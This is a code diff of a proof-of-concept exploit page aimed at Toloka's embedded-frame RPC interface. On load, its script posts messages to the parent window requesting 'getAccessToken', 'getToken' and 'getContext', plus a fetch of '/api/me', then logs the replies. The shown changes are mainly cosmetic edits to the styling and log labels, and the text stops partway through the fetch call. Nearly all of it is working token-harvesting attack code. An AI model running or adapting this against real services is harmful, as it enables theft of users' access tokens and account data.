@@ -4,13 +4,13 @@
   <meta charset="UTF-8">
   <title>PoC - Toloka RPC Exploit</title>
   <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
     pre { white-space: pre-wrap; word-break: break-word; }
   </style>
 </head>
 <body>
-  <h2>📡 PoC - getAccessToken / getToken / getContext / fetch</h2>
-  <pre id="log">⏳ Waiting for responses...</pre>
+  <h2>✅ Toloka RPC PoC</h2>
+  <pre id="log">[⏳] Waiting for RPC responses...</pre>
 
   <script>
     const logEl = document.getElementById('log');
@@ -20,26 +20,25 @@
       console.log(...args);
     };
 
-    function callRPC(method, payload = {}) {
+    function callRPC(name, payload = {}) {
       const id = crypto.randomUUID();
-
       window.addEventListener('message', function handler(e) {
         if (e.origin !== 'https://tb.toloka.dev') return;
-        if (e.data?.id === id && e.data?.type === 'rpc') {
-          log(`✅ [${method}]`, e.data.payload);
+        if (e.data?.type === 'rpc' && e.data.id === id) {
+          log(`[✅ ${name} Response from parent]`, e.data.payload);
           window.removeEventListener('message', handler);
         }
       });
-
-      window.parent.postMessage({ type: 'rpc', id, name: method, payload }, '*');
-      log(`📤 Sent ${method} with id ${id}`);
+      const msg = { type: 'rpc', id, name, payload };
+      window.parent.postMessage(msg, '*');
+      log(`[📤] Sent "${name}" with id ${id}`, msg);
     }
 
+    // عند تحميل الصفحة، نفذ RPC
     window.onload = () => {
-      // أرسل الأوامر عند تحميل الصفحة
-      ['getAccessToken', 'getToken', 'getContext'].forEach(method => callRPC(method));
-      
-      // طلب fetch لمعلومات المستخدم
+      callRPC('getAccessToken');
+      callRPC('getToken');
+      callRPC('getContext');
       callRPC('fetch', {
         url: '/api/me',
         requestInit: { method: 'GET' }
